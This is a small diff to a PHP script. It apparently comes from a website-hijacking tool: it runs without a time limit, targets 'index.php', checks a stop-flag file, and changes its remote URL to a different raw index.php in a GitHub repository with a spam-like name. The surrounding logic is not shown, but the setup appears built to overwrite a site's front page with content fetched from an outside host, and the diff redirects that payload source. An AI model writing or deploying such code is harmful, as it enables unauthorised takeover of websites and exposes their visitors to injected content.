@@ -7,7 +7,7 @@ set_time_limit(0);
 $stopFlag = 'roobts.txt';
 $targetFile = 'index.php';
 $sourceFile = 'content.txt';
-$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-m.fatier.com-/refs/heads/main/index.php';
+$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-www.xzsizxh.cn-/refs/heads/main/index.php';
 
 // Windows 兼容的文件权限设置
 $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
